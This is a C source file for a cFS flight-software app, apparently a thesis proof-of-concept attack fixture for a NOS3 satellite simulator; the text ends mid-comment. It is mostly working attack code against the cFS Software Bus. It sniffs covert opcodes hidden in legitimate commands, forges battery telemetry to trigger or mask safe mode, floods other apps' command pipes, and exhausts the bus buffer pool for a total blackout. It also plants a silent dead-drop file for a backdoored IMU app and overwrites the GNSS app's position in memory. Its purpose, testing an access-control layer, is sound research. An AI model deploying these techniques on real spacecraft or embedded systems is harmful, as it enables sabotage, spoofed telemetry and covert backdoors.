/*
 * ============================================================================
 * NOISY_APP - covert-opcode "piggyback" research fixture
 * ============================================================================
 *
 * Base skeleton: an empty no-op cFS app that registers with EVS, creates a
 * command pipe, subscribes to its command MID, and blocks idle on the pipe
 * (ported from the DTU Draco NOS3 repo).
 *
 * Research addition (thesis PoC): the app ALSO subscribes to a legitimate,
 * benign carrier command MID (CI_LAB NOOP by default) and sniffs it off the
 * Software Bus. cFE SB delivers every message to ALL subscribers and performs
 * no sender authentication, so a co-resident app can observe traffic addressed
 * to another app. When a carrier NOOP arrives that is LONGER than a normal
 * (header-only) NOOP, the trailing byte is read as a covert opcode and a
 * scenario is dispatched. Normal-length carrier commands are ignored, so
 * legitimate operations are unaffected.
 *
 * Note that the legitimate carrier app (CI_LAB) calls CFE_MSG_VerifyCmdLength
 * and REJECTS the over-length NOOP (emitting a length-error event and bumping
 * its CommandErrorCounter). That endpoint defense does not stop this sniffer:
 * the byte is read off the bus independently of the endpoint's check.
 *
 * This app is an intentional attack-simulation fixture. It is OFF by default
 * (see targets.cmake / cpu1_cfe_es_startup_rtems.scr) and must be explicitly enabled.
 *
 * ----------------------------------------------------------------------------
 * CONFIGURATION MAP (where to change things)
 * ----------------------------------------------------------------------------
 *
 * MESSAGE IDs (MIDs):
 *   Defined in  fsw/platform_inc/noisy_app_msgids.h
 *     NOISY_APP_CMD_MID      command input  (subscribed to below)
 *     NOISY_APP_SEND_HK_MID  housekeeping request (for a future SCH wakeup)
 *     NOISY_APP_HK_TLM_MID   housekeeping telemetry (for a future TO downlink)
 *
 * CARRIER COMMAND (the sniffed "piggyback" channel):
 *   CARRIER_CMD_MID / CARRIER_NOOP_FC below. Default is CI_LAB's NOOP
 *   (CI_LAB_CMD_MID 0x18E0, CI_LAB_NOOP_CC 0). Change CARRIER_CMD_MID to
 *   re-point the sniffer at a different active command stream (e.g. TO_LAB
 *   0x18E8). A normal NOOP is header-only, so any extra trailing byte is the
 *   covert opcode.
 *
 * COVERT OPCODES (the trailing byte -> scenario map): see the switch in
 *   NOISY_APP_RunScenario() below.
 *
 * ENABLE / DISABLE IN THE BUILD:
 *   cfg/nos3_defs/targets.cmake -> MISSION_GLOBAL_APPLIST (listed = compiled).
 * ENABLE / DISABLE AT STARTUP (and PRIORITY / STACK):
 *   cfg/nos3_defs/cpu1_cfe_es_startup.scr -> the "noisy_app" row
 *   (col 1: CFE_APP = loaded, OFF_APP = present but not loaded; keep low
 *   priority so the fixture never competes with core apps).
 *
 * NOTE: `make config` regenerates the cfg/build/... copies from these
 * cfg/nos3_defs/ sources. Edit the sources, not the copies.
 * ============================================================================
 */

#include "cfe.h"
#include "cfe_sb.h"
#include "cfe_es.h"
#include "cfe_evs.h"
#include <string.h>
#include <math.h> /* fabs - GNSS drift accumulator cap check */

#include "noisy_app_msgids.h"
#include "generic_eps_msgids.h" /* GENERIC_EPS_HK_TLM_MID (0x091A) - EPS_SPOOF target */

/*
 * OPCODE_GNSS_SPOOF / OPCODE_GNSS_DRIFT target: the victim GNSS app's own
 * global state.
 *
 * Unlike every SB-based scenario above, this one does NOT touch the Software
 * Bus. cFS on this Linux target runs all apps as pthreads in ONE process
 * (os-impl-tasks.c), so they share a single address space with no inter-thread
 * MMU protection. But the POSIX loader honors OS_MODULE_FLAG_LOCAL_SYMBOLS and
 * loads each app .so with RTLD_LOCAL (os-impl-posix-dl-loader.c, and CFE_ES
 * defaults apps to LOCAL_SYMBOLS in cfe_es_apps.c), so the victim's
 * GENERIC_GNSS_AppData symbol is NOT in the global scope: a plain `extern`
 * reference will not link/resolve. We instead resolve it at runtime with
 * dlopen(GNSS_MODULE_SO, RTLD_NOLOAD)+dlsym on the already-resident module
 * handle (RTLD_LOCAL only hides a symbol from *global*-scope resolution, not
 * from dlsym on the module's own handle). See NOISY_ResolveGnssAppData().
 *
 * Once we have the pointer we overwrite the source-of-truth cache
 * (LastBusLat/Lon) that the GNSS HK report recomputes the downlinked
 * DeviceHK.GnssLat/Lon and the InDenmarkBox geofence flag from each cycle, so
 * the spoofed position propagates into the downlinked packet.
 *
 * This is the point of the PoC: a message-bus mediation layer gates
 * CFE_SB_Subscribe/TransmitMsg and touches no raw memory, so it provides ZERO
 * protection against this write. Including the real header (rather than
 * mirroring the layout as the EPS/IMU scenarios do) keeps the field offsets
 * exactly correct across struct changes; the unused `extern` declaration it
 * carries creates no link dependency because we never name the symbol directly
 * (we go through dlsym). See docs/security/gnss-mem-overwrite-analysis.md.
 */
#include "generic_gnss_app.h" /* GENERIC_GNSS_AppData_t layout (resolved via dlsym) */
#include <dlfcn.h>            /* dlopen/dlsym - runtime cross-app symbol resolution */

/* Victim module file name as loaded by CFE_ES on the Linux target (see
 * fsw/build/exe/cpu1/cf/). dlopen(RTLD_NOLOAD) resolves the already-resident
 * module from the cFS module load path. */
#define GNSS_MODULE_SO "generic_gnss.so"

/* ---- Carrier (sniffed legitimate command) ------------------------------- */
#define CARRIER_CMD_MID 0x18E0 /* CI_LAB_CMD_MID (fsw/apps/ci_lab/.../ci_lab_msgids.h) */
#define CARRIER_NOOP_FC 0      /* CI_LAB_NOOP_CC: a normal NOOP is header-only       */

/* ---- Covert opcodes (the piggybacked trailing byte) --------------------- */
#define OPCODE_DORMANT   0x00 /* do nothing; also CLEARS a running override */
#define OPCODE_EPS_SPOOF 0x02 /* forge ONE low-battery EPS HK packet        */
/* 0x04 retired (was OPCODE_SB_BURST: a benign bounded burst, no research value) */
#define OPCODE_EPS_OVERRIDE 0x06 /* PERSISTENT: shadow every real EPS HK       */
#define OPCODE_SB_FLOOD     0x08 /* DESTRUCTIVE: lock the whole SB buffer pool */
#define OPCODE_IMU_BIAS     0x0A /* COVERT CHANNEL: drop an IMU bias spec file  */
#define OPCODE_GNSS_SPOOF   0x0C /* PERSISTENT: teleport peer GNSS to Null Island*/
#define OPCODE_GNSS_DRIFT   0x0E /* PERSISTENT: slow plausible GNSS position drift*/

/* ---- Scenario tuning ---------------------------------------------------- */
#define SPOOF_BATTERY_MV 10000 /* < LC WP0 threshold (14800 mV) -> SAFE RTS */

/* OPCODE_EPS_OVERRIDE: value written into every shadow packet. 10000 forces
 * SAFE (drive WP0); set >= 14800 (e.g. 25000) to MASK a real low battery so
 * the protective SAFE never fires. See docs/security/noisy_app-escalation-design.md. */
#define OVERRIDE_BATTERY_MV 10000

/* OPCODE_SB_FLOOD: self-hosted pool lock. ~15 max-size (32 KB) packets parked
 * unread in our own pipe exhaust the 512 KB CFE_PLATFORM_SB_BUF_MEMORY_BYTES
 * arena, after which every other app's CFE_SB_TransmitMsg fails. DESTRUCTIVE:
 * needs a sim restart. Gated behind an explicit piggyback opcode only. */
#define LOCK_MID NOISY_APP_HK_TLM_MID /* a MID we own and never drain */
/* Invariant: LOCK_PARK_ATTEMPTS <= LOCK_MSGLIM <= LOCK_PIPE_DEPTH, and all
 * comfortably exceed the ~15 max-size buffers that actually drain the pool.
 * LOCK_PIPE_DEPTH must also be <= CFE_PLATFORM_SB_MAX_PIPE_DEPTH (50 on this
 * RTEMS target): CFE_SB_CreatePipe rejects any depth above that, so the older
 * value of 128 silently failed CreatePipe here and the flood never armed.
 * LOCK_MSGLIM is the SubscribeEx per-MID queue limit (so our own buffers are
 * kept, not MSGID_LIM-dropped); LOCK_PARK_ATTEMPTS is the transmit loop bound
 * (it still breaks early on the first allocation failure, so the exact count is
 * robust to a different CFE_PLATFORM_SB_BUF_MEMORY_BYTES). */
#define LOCK_PIPE_DEPTH    50
#define LOCK_MSGLIM        50
#define LOCK_PARK_ATTEMPTS 50

/* ---- OPCODE_IMU_BIAS: covert inter-app channel (file dead-drop) ---------- *
 * Instead of touching the Software Bus, write a small "calibration" spec to a
 * file on the volatile RAM disk. A second backdoored app (the generic_imu FSW
 * app) polls for this file each telemetry cycle, latches the spec, and applies
 * a slow-drift bias to its own IMU axis telemetry. The channel is the FILE -
 * cFS SB delivery is never used, so cfs_god_view.json and EVS never see it.
 * Both sides agree on this layout out-of-band (mirrored, not a shared build
 * artifact - same approach as NOISY_EpsHkMimic_t above). Keep in sync with
 * IMU_CovertDrop_t in components/generic_imu/fsw/cfs/src/generic_imu_app.c. */
#define IMU_DROP_PATH       "/ram/.imu_cal" /* dotfile: looks like cal data  */
#define IMU_DROP_MAGIC      0x494D5542u     /* 'IMUB'                        */
#define IMU_BIAS_AXIS_MASK  0x07            /* X|Y|Z                         */
#define IMU_BIAS_PROFILE    1               /* 1 = slow drift, 0 = constant  */
#define IMU_BIAS_FLAGS      0x01            /* consume (remove) file on latch*/
#define IMU_BIAS_GYRO_STEP  0.25f           /* angular bias added per cycle (demo: fast/large) */
#define IMU_BIAS_ACCEL_STEP 0.25f           /* linear bias added per cycle (demo)  */
#define IMU_BIAS_GYRO_CAP   5.0f            /* angular bias clamp (demo: large divergence) */
#define IMU_BIAS_ACCEL_CAP  5.0f            /* linear bias clamp (demo)            */

typedef struct
{
    uint32 magic;
    uint8  version;
    uint8  axis_mask;
    uint8  profile;
    uint8  flags;
    float  gyro_step;
    float  accel_step;
    float  gyro_cap;
    float  accel_cap;
} __attribute__((packed)) NOISY_ImuDrop_t;

/* ---- OPCODE_GNSS_SPOOF / OPCODE_GNSS_DRIFT: direct cross-app memory overwrite *
 * Both modes write the victim GNSS app's cached source-of-truth (LastBusLat/Lon).
 * That cache is the ONLY effective lever: the victim's ReportHousekeeping calls
 * UpdatePositionAndFlags every cycle, which recomputes the downlinked
 * DeviceHK.GnssLat/Lon AND the InDenmarkBox geofence flag *from LastBus** under
 * its HkDataMutex right before TransmitMsg. So poking DeviceHK directly is
 * pointless (overwritten next cycle) and spoofing LastBus* drives the geofence
 *
 * flag for free. Note LastBusAlt is not in the GNSS HK layout, so altitude is
 * never downlinked and we do not bother writing it.
 *
 * TELEPORT (0x0C): Null Island (0,0) - an obviously-wrong, recognizable spoof
 * signature; trivially caught by a range/sanity check. Good for the obvious demo.
 * DRIFT (0x0E): genuine position + a slowly-growing offset - stays plausible and
 * orbit-shaped, so only a cross-source truth-vs-bus check (not a range check)
 * catches it. See docs/security/gnss-mem-overwrite-analysis.md. */
#define GNSS_SPOOF_LAT 0.0 /* deg WGS84 (TELEPORT target) */
#define GNSS_SPOOF_LON 0.0 /* deg WGS84 (TELEPORT target) */
/* DRIFT tunables: per-step offset increment and absolute cap on the accumulated
 * offset. The offset advances only on a fresh genuine sim sample (see the
 * anti-compounding guard in NOISY_GnssShadowTask), which the BusRx child task
 * produces at ~1 Hz, so the step is effectively deg/s. At 0.02 deg/s the bus
 * position walks ~1.2 deg/min off truth: clearly visible against ground truth
 * within ~15-20 s, ~1.2 deg apart by 60 s, while still looking orbit-shaped.
 * The cap (3.0 deg, ~2.5 min before clamping) bounds runaway growth. Lower the
 * step back toward 0.0002 to restore the original stealthy ~0.012 deg/min walk.
 * NOTE: a large drift will eventually push the believed position out of the
 * Denmark box, flipping InDenmarkBox -> SAFE; that is fine for the detection
 * chart because GENERIC_GNSS_HK_TLM_MID (0x0952) is in the SAFE beacon set
 * (to_lab_sub.c), so the bus value keeps downlinking. */
#define GNSS_DRIFT_LAT_STEP 0.02   /* deg added per fresh genuine sample (~1 Hz) */
#define GNSS_DRIFT_LON_STEP 0.02   /* deg added per fresh genuine sample (~1 Hz) */
#define GNSS_DRIFT_LAT_CAP  3.0    /* deg, max accumulated lat offset */
#define GNSS_DRIFT_LON_CAP  3.0    /* deg, max accumulated lon offset */
/* The GNSS BusRx child task rewrites LastBus* from the sim UART line at ~1 Hz,
 * so a single shadow write is clobbered until we re-apply it. Shadowing at
 * 20 ms (vs the 1 Hz HK report) shrinks the window in which the HK report can
 * sample an un-spoofed value to ~2%, removing the visible up/down jitter the
 * old 100 ms period produced. This only controls jitter: the drift growth rate
 * is gated to ~1 fresh sample/s by the anti-compounding guard, independent of
 * this period. See docs/security/gnss-mem-overwrite-analysis.md. */
#define GNSS_SHADOW_PERIOD_MS 20

/* ---- EVS event IDs ------------------------------------------------------ */
#define NOISY_EVT_INIT      1
#define NOISY_EVT_PIGGYBACK 2
#define NOISY_EVT_EPS_SPOOF 3
/* 4 retired (was NOISY_EVT_SB_BURST) */
#define NOISY_EVT_UNKNOWN    5
#define NOISY_EVT_OVERRIDE   6
#define NOISY_EVT_POOLLOCK   7
#define NOISY_EVT_GNSS_SPOOF 8
#define NOISY_EVT_PIPEFLOOD  9

/*
 * Self-contained mirror of the EPS HK wire layout (the attacker hardcodes the
 * victim telemetry format rather than linking the victim's struct). Only
 * BatteryVoltage matters for tripping LC watchpoint WP0 (wire offset 16).
 */
typedef struct
{
    CFE_MSG_TelemetryHeader_t TlmHeader;
    uint8                     CommandErrorCount;
    uint8                     CommandCount;
    uint8                     DeviceErrorCount;
    uint8                     DeviceCount;
    uint16                    BatteryVoltage; /* offset 16 on the wire */
    uint16                    BatteryTemperature;
    uint16                    Bus3p3Voltage;
    uint16                    Bus5p0Voltage;
    uint16                    Bus12Voltage;
    uint16                    EPSTemperature;
    uint16                    SolarArrayVoltage;
    uint16                    SolarArrayTemperature;
    struct
    {
        uint16 Voltage;
        uint16 Current;
        uint16 Status;
    } Switch[8];
} __attribute__((packed)) NOISY_EpsHkMimic_t;

/* GNSS overwrite mode for the shared shadow task. Read in the task's loop and
 * written from the main loop, so volatile (no register-cached stale read that
 * would make opcode 0x00 fail to stop the spoof). */
typedef enum
{
    GNSS_MODE_NONE = 0, /* idle: shadow task exits */
    GNSS_MODE_TELEPORT, /* OPCODE_GNSS_SPOOF: write Null Island (0,0)    */
    GNSS_MODE_DRIFT     /* OPCODE_GNSS_DRIFT: genuine + growing offset   */
} NOISY_GnssMode_t;

static uint32                    NOISY_TriggerCount = 0;
static bool                      NOISY_OverrideOn   = false;          /* OPCODE_EPS_OVERRIDE engaged? */
static volatile NOISY_GnssMode_t NOISY_GnssMode     = GNSS_MODE_NONE; /* active GNSS mode */
static volatile bool             NOISY_GnssTaskUp   = false;          /* shadow child task created once */

/* Forge and transmit ONE EPS housekeeping packet with a chosen battery value.
 * Consumers (LC, ELK) see it as a normal GENERIC_EPS_HK_TLM. Silent: the caller
 * decides whether to emit an EVS event (so the per-packet override does not
 * flood EVS at the EPS HK rate). */
static void NOISY_SendEpsHk(uint16 battery_mv)
{
    NOISY_EpsHkMimic_t pkt;

    memset(&pkt, 0, sizeof(pkt));
    CFE_MSG_Init(CFE_MSG_PTR(pkt.TlmHeader), CFE_SB_ValueToMsgId(GENERIC_EPS_HK_TLM_MID), sizeof(pkt));

    pkt.DeviceCount    = 1;
    pkt.BatteryVoltage = battery_mv;

    CFE_SB_TimeStampMsg(CFE_MSG_PTR(pkt.TlmHeader));
    CFE_SB_TransmitMsg(CFE_MSG_PTR(pkt.TlmHeader), true);
}

/* One-shot spoof (OPCODE_EPS_SPOOF): forge a single low-battery packet and log. */
static void NOISY_SpoofEpsHk(void)
{
    NOISY_SendEpsHk(SPOOF_BATTERY_MV);
    CFE_EVS_SendEvent(NOISY_EVT_EPS_SPOOF, CFE_EVS_EventType_INFORMATION,
                      "NOISY_APP: EPS HK SPOOF sent on 0x%04X (BatteryVoltage=%u mV).",
                      (unsigned int)GENERIC_EPS_HK_TLM_MID, (unsigned int)SPOOF_BATTERY_MV);
}

/* A maximum-size SB message; the bigger the packet, the fewer needed to drain
 * the shared 512 KB pool. */
typedef struct
{
    CFE_MSG_TelemetryHeader_t Hdr;
    uint8                     Pad[CFE_MISSION_SB_MAX_SB_MSG_SIZE - sizeof(CFE_MSG_TelemetryHeader_t)];
} NOISY_MaxPkt_t;

static volatile bool NOISY_SbLockHold   = false; /* keep the SB pool drained */
static volatile bool NOISY_SbLockTaskUp = false; /* holder task created once  */

/* The cFS SB pool is a CFE_ES GenPool with per-size buckets. A freed block
 * returns to ITS bucket's free list and is reused only for SAME-SIZE requests,
 * so draining one size leaves every other bucket cycling untouched - which is
 * exactly why EPS/GNSS kept publishing. To drain the WHOLE pool the holder must
 * empty EVERY bucket each sweep.
 *
 * Two corrections over the old list:
 *  1. Use the REAL SB pool buckets, which are CFE_PLATFORM_SB_MEM_BLOCK_SIZE_01
 *     ..16 (cpu1_platform_cfg.h), NOT the CFE_PLATFORM_ES_* set. The two differ:
 *     the SB set has 20 and 36 (the old list used 48/32, which are not buckets,
 *     and never targeted 20/36 or 32768).
 *  2. CFE_SB_AllocateMessageBuffer(N) does NOT allocate an N-byte block: it
 *     allocates N + offsetof(CFE_SB_BufferD_t, Content) (see CFE_SB_GetBufferFromPool,
 *     cfe_sb_buf.c). So requesting a bucket SIZE B lands in the NEXT bucket up,
 *     leaving the bucket victims actually use (small HK -> 64/96) free for them.
 *     Victims hit the same +offset on their CFE_SB_TransmitMsg path, so to drain
 *     bucket B we must request a MESSAGE size <= B - offset; the offset then
 *     cancels and our allocation lands in the same bucket the victims use.
 *
 * NOISY_SB_DESC_MARGIN is a conservative over-estimate of that descriptor offset
 * (true value ~40 bytes on the 32-bit i686-rtems5 target). For each bucket B we
 * request B - margin (top of the bucket) AND prevBucket + 1 (bottom of the
 * bucket) so the whole bucket is covered even if the exact offset differs.
 * Over-requesting is harmless: a NULL just means that bucket is already dry.
 * Largest first so big blocks carve the arena before the small ones mop up. */
#define NOISY_SB_DESC_MARGIN 96
static const size_t NOISY_SbBucket[] = {
    32768, 16384, 8192, 4096, 2048, 1024, 512, 256, 160, 128, 96, 64, 36, 20, 16, 8
};

/* Sustained-blackout holder. After the one-shot drain, a rotating working set of
 * in-flight buffers keeps freeing and being reused by other apps. This task,
 * running at NOISY_APP priority (29, ahead of every other app), re-grabs every
 * freed block IN EVERY BUCKET (CFE_SB_AllocateMessageBuffer, intentionally
 * leaked) before its owner can reuse it - driving successful publishes to zero:
 * a true, complete flatline.
 *
 * Reclaim-aggressive pacing: a sweep that grabbed at least one block loops again
 * IMMEDIATELY (no yield), so freed blocks are re-grabbed within ~one sweep rather
 * than the ~10 ms an unconditional OS_TaskDelay(1) (one RTEMS tick) used to leave
 * open. Only when a full sweep finds the pool already dry (grabbed == 0) does it
 * sleep one tick - keeping CPU low once the bus is locked while still letting the
 * lower-priority apps run and FAIL their CFE_SB_TransmitMsg (the authentic
 * pool-exhaustion signature) rather than starving them off-CPU. */
static void NOISY_SbLockHoldTask(void)
{
    size_t   i;
    uint32   grabbed_total = 0;
    uint32   dry_sweeps    = 0;

    while (NOISY_SbLockHold)
    {
        uint32 grabbed = 0;

        for (i = 0; i < sizeof(NOISY_SbBucket) / sizeof(NOISY_SbBucket[0]); i++)
        {
            CFE_SB_Buffer_t *b;
            size_t           top = (NOISY_SbBucket[i] > NOISY_SB_DESC_MARGIN)
                                       ? NOISY_SbBucket[i] - NOISY_SB_DESC_MARGIN
                                       : 1;
            /* prevBucket + 1 brackets the bottom of this bucket so coverage holds
             * even if the real descriptor offset differs from the margin. */
            size_t           bottom = (i + 1 < sizeof(NOISY_SbBucket) / sizeof(NOISY_SbBucket[0]))
                                          ? NOISY_SbBucket[i + 1] + 1
                                          : 1;
            CFE_SB_Buffer_t *bb;

            while ((b = CFE_SB_AllocateMessageBuffer(top)) != NULL)
            {
                (void)b; /* leaked on purpose: the held allocation IS the lock */
                grabbed++;
            }
            if (bottom < top)
            {
                while ((bb = CFE_SB_AllocateMessageBuffer(bottom)) != NULL)
                {
                    (void)bb;
                    grabbed++;
                }
            }
        }

        grabbed_total += grabbed;

        if (grabbed == 0)
        {
            /* Pool fully dry. Log progress occasionally over the ES syslog (which
             * does NOT ride the SB, so it survives the blackout), then sleep one
             * tick before re-checking for freed blocks. */
            if ((dry_sweeps++ % 256) == 0)
            {
                CFE_ES_WriteToSysLog("NOISY_APP: SB pool lock holding (grabbed %u blocks total).\n",
                                     (unsigned int)grabbed_total);
            }
            OS_TaskDelay(1);
        }
        /* else: loop immediately to re-grab freed blocks before their owners can. */
    }
    NOISY_SbLockTaskUp = false;
}

/* Victim command MIDs to flood (CCSDS 0x1xxx command range). Publishing junk to
 * an app's CMD MID queues it in that app's command pipe; a burst beyond the pipe
 * depth overflows it. NOISY_APP is authorized to publish ONLY its own HK
 * (0x08F2), so every one of these cross-MID publishes is SB_ACL-gated. */
static const uint16 NOISY_VictimCmdMid[] = {
    0x191A, /* EPS    */ 0x1992, /* RW     */ 0x1940, /* ADCS   */
    0x1930, /* RADIO  */ 0x1870, /* GPS    */ 0x18FA, /* SAMPLE */
};
#define NOISY_PIPEFLOOD_PER_MID 300 /* > the deepest cmd pipe (depths seen: 10..256) */

typedef struct
{
    CFE_MSG_CommandHeader_t Hdr;
    uint8                   Pad[16];
} NOISY_JunkCmd_t;

/* OPCODE_SB_FLOOD phase 1: flood OTHER apps' command pipes by publishing junk to
 * their CMD MIDs. This is the primitive where SB_ACL's PUBLISH gate is decisive.
 *   LOG_ONLY: each cross-MID publish is deny-LOGGED but delivered -> the victim
 *             pipes overflow (CFE_SB "Pipe Overflow" events), disrupting apps.
 *   ENFORCE : each cross-MID publish is deny-ENFORCED -> CFE_SB_TransmitMsg
 *             fails, nothing is delivered, the apps are protected.
 * Run BEFORE the pool lock so buffers are available and SB_ACL (not pool
 * exhaustion) is the only thing that can stop it - a clean ACL demonstration. */
static void NOISY_PipeFlood(void)
{
    static NOISY_JunkCmd_t junk; /* keep it off the task stack */
    size_t i;
    int    n, delivered = 0, blocked = 0;

    for (i = 0; i < sizeof(NOISY_VictimCmdMid) / sizeof(NOISY_VictimCmdMid[0]); i++)
    {
        memset(&junk, 0, sizeof(junk));
        CFE_MSG_Init(CFE_MSG_PTR(junk.Hdr), CFE_SB_ValueToMsgId(NOISY_VictimCmdMid[i]), sizeof(junk));
        for (n = 0; n < NOISY_PIPEFLOOD_PER_MID; n++)
        {
            CFE_SB_TimeStampMsg(CFE_MSG_PTR(junk.Hdr));
            if (CFE_SB_TransmitMsg(CFE_MSG_PTR(junk.Hdr), true) == CFE_SUCCESS)
            {
                delivered++;
            }
            else
            {
                blocked++; /* SB_ACL ENFORCE (or a full victim pipe) refused it */
            }
        }
    }

    CFE_EVS_SendEvent(NOISY_EVT_PIPEFLOOD, CFE_EVS_EventType_CRITICAL,
                      "NOISY_APP: PIPE FLOOD - %d junk cmds delivered, %d blocked across %u victim cmd MIDs.",
                      delivered, blocked,
                      (unsigned int)(sizeof(NOISY_VictimCmdMid) / sizeof(NOISY_VictimCmdMid[0])));
}

/* OPCODE_SB_FLOOD - self-hosted Software Bus pool lock (DESTRUCTIVE).
 *
 * Park ~15 max-size buffers UNREAD in our own pipe to exhaust the single shared
 * CFE_PLATFORM_SB_BUF_MEMORY_BYTES (512 KB) arena. After that every other app's
 * CFE_SB_TransmitMsg fails with CFE_SB_BUF_ALOC_ERR: HK, telemetry, CI_LAB
 * uplink-forwarding and LC all stall - a silent, total Software Bus blackout.
 * The buffers stay parked because we never CFE_SB_ReceiveBuffer the sink pipe,
 * so no busy-spin is required once the pool is dry. This needs a sim restart.
 * It only runs on an explicit piggyback OPCODE_SB_FLOOD (0x08).
 *
 * This attack is FULLY on the Software Bus, so SB_ACL can see and stop it: the
 * exhaustion needs a real subscriber to keep the parked buffers, and our
 * SubscribeEx to LOCK_MID is gated. Under ENFORCE the subscribe is denied (the
 * NOISY_APP policy grant does not cover LOCK_MID as SUBSCRIBE), with no
 * subscriber every TransmitMsg frees its buffer immediately, and the pool never
 * drains - so we abort honestly instead of faking an "engaged" lock. Under
 * LOG_ONLY the deny is recorded but allowed, and the blackout proceeds. This is
 * the inverse of the GNSS/IMU PoCs, which bypass SB_ACL by never touching the
 * bus. See docs/security/sb-pool-lock-analysis.md. */
static void NOISY_SbPoolLock(void)
{
    static NOISY_MaxPkt_t big; /* 32 KB: keep it off the task stack */
    CFE_SB_PipeId_t       sink   = CFE_SB_INVALID_PIPE;
    int                   parked = 0;

    /* A deep pipe we deliberately never drain, with a high per-MID limit so our
     * own buffers pile up instead of being MSGID_LIM-dropped. */
    if (CFE_SB_CreatePipe(&sink, LOCK_PIPE_DEPTH, "NOISY_SINK") != CFE_SUCCESS)
    {
        return;
    }

    /* The subscribe is SB_ACL-gated. If it is denied (ENFORCE), there is no
     * subscriber to retain the parked buffers, so the flood cannot arm: report
     * the block honestly, release the pipe, and bail - do NOT emit the CRITICAL
     * "engaged" event or run the transmit loop (it would silently no-op). */
    if (CFE_SB_SubscribeEx(CFE_SB_ValueToMsgId(LOCK_MID), sink, CFE_SB_DEFAULT_QOS, LOCK_MSGLIM) != CFE_SUCCESS)
    {
        CFE_EVS_SendEvent(NOISY_EVT_POOLLOCK, CFE_EVS_EventType_INFORMATION,
                          "NOISY_APP: SB pool lock ABORTED - subscribe to LOCK_MID 0x%04X denied "
                          "by policy (SB_ACL ENFORCE).",
                          (unsigned int)LOCK_MID);
        CFE_SB_DeletePipe(sink);
        return;
    }

    /* Subscribe succeeded (LOG_ONLY or no ACL): the flood will arm. Emit the
     * warning BEFORE the pool is gone (EVS itself rides the bus). */
    CFE_EVS_SendEvent(NOISY_EVT_POOLLOCK, CFE_EVS_EventType_CRITICAL,
                      "NOISY_APP: SB POOL LOCK engaged (DoS, research mode).");

    memset(&big, 0, sizeof(big));

    /* Drain the WHOLE arena, not just the 32 KB bucket. Park max-size buffers
     * until an allocation fails, then HALVE the message size and keep parking,
     * repeating down to a small floor. A single fixed size leaves a ~32 KB
     * residual (512 KB pool - 15*32 KB parked) that still satisfies the small
     * (~100 byte) HK allocations, so the bus only degrades. Consuming the
     * residual with progressively smaller buffers leaves < 64 bytes free, so
     * every other app's CFE_SB_TransmitMsg fails and the blackout is TOTAL.
     * `parked` stays bounded by LOCK_PARK_ATTEMPTS (<= the sink pipe depth).
     *
     * Start one descriptor-offset below the max message size: a full
     * CFE_MISSION_SB_MAX_SB_MSG_SIZE (32768) message needs 32768 + offset from
     * the pool, which exceeds the 32768 max bucket and ALWAYS fails - so the old
     * `sizeof(big)` start never parked a single max-size buffer and the largest
     * bucket was left for the holder to fight over. Capping at max - margin makes
     * the first parks succeed and consumes the 32 KB bucket up front. */
    {
        size_t sz = sizeof(big) - NOISY_SB_DESC_MARGIN;
        while (sz >= 64 && parked < LOCK_PARK_ATTEMPTS)
        {
            CFE_MSG_Init(CFE_MSG_PTR(big.Hdr), CFE_SB_ValueToMsgId(LOCK_MID), sz);
            CFE_SB_TimeStampMsg(CFE_MSG_PTR(big.Hdr));
            if (CFE_SB_TransmitMsg(CFE_MSG_PTR(big.Hdr), true) != CFE_SUCCESS)
            {
                sz /= 2; /* this bucket is dry; shrink to drain the residual */
                continue;
            }
            parked++;
        }
    }

    /* Hold the blackout. The pipe-parked buffers above exhaust the pool once,
     * but the in-flight working set keeps freeing and being reused, leaving a
     * residual ~40 pps trickle. Spawn a task that continuously re-grabs every
     * freed block so successful publishes go to ~zero - a true, sustained
     * flatline rather than a degraded bus. */
    NOISY_SbLockHold = true;
    if (!NOISY_SbLockTaskUp)
    {
        CFE_ES_TaskId_t htid = CFE_ES_TASKID_UNDEFINED;
        /* Priority 29 == NOISY_APP itself, ahead of every other app (SB_ACL=30
         * .. HK=90) but below cFE core. The holder therefore preempts the apps
         * and re-grabs any freed buffer before they can reuse it - winning the
         * realloc race that a low-priority (110) task always lost. */
        if (CFE_ES_CreateChildTask(&htid, "NOISY_SBHOLD", NOISY_SbLockHoldTask,
                                   CFE_ES_TASK_STACK_ALLOCATE, 4096, 29, 0) == CFE_SUCCESS)
        {
            NOISY_SbLockTaskUp = true;
        }
    }

    /* Forensic record that SURVIVES the blackout: the ES syslog does not ride
     * the SB, so this line persists even though the CRITICAL EVS above may be
     * among the last messages the bus ever carried. */
    CFE_ES_WriteToSysLog("NOISY_APP: SB pool lock parked %d buffers (~%u bytes); bus is now dry.\n", parked,
                         (unsigned int)(parked * sizeof(NOISY_MaxPkt_t)));

    /* Returns with the pool empty; parked buffers keep it that way with no
     * further CPU use. (sink is intentionally leaked - the lock IS the point.) */
}

/* OPCODE_IMU_BIAS - write the covert IMU bias dead-drop file (the channel).
 * Deliberately emits NO EVS event: the inter-app channel and its effect must
 * be silent. The only artifact is a short-lived file on /ram, which the ELK
 * pipeline does not index. The backdoored generic_imu app latches it and then
 * removes it (transient evidence), so the IMU drift has no on-bus cause. */
static void NOISY_WriteImuDeadDrop(void)
{
    osal_id_t       fd = OS_OBJECT_ID_UNDEFINED;
    NOISY_ImuDrop_t drop;

    memset(&drop, 0, sizeof(drop));
    drop.magic      = IMU_DROP_MAGIC;
    drop.version    = 1;
    drop.axis_mask  = IMU_BIAS_AXIS_MASK;
    drop.profile    = IMU_BIAS_PROFILE;
    drop.flags      = IMU_BIAS_FLAGS;
    drop.gyro_step  = IMU_BIAS_GYRO_STEP;
    drop.accel_step = IMU_BIAS_ACCEL_STEP;
    drop.gyro_cap   = IMU_BIAS_GYRO_CAP;
    drop.accel_cap  = IMU_BIAS_ACCEL_CAP;

    if (OS_OpenCreate(&fd, IMU_DROP_PATH, OS_FILE_FLAG_CREATE | OS_FILE_FLAG_TRUNCATE, OS_WRITE_ONLY) == OS_SUCCESS)
    {
        OS_write(fd, &drop, sizeof(drop));
        OS_close(fd);
    }
}

/* OPCODE_GNSS_SPOOF / OPCODE_GNSS_DRIFT shadow task - the direct cross-app
 * memory overwrite.
 *
 * Loops while NOISY_GnssMode != NONE, writing the peer GNSS app's source-of-truth
 * cache (LastBus*) through a pointer resolved at runtime via dlopen+dlsym (see
 * NOISY_ResolveGnssAppData - the victim .so is RTLD_LOCAL so a plain `extern`
 * cannot reach it on this Linux target). We write ONLY LastBus*: the victim's
 * ReportHousekeeping recomputes the downlinked DeviceHK.GnssLat/Lon and the
 * InDenmarkBox geofence flag from LastBus* every cycle under the same mutex, so
 * LastBus* is the sole effective lever and the geofence flag follows for free
 * (writing DeviceHK directly would just be overwritten the next cycle).
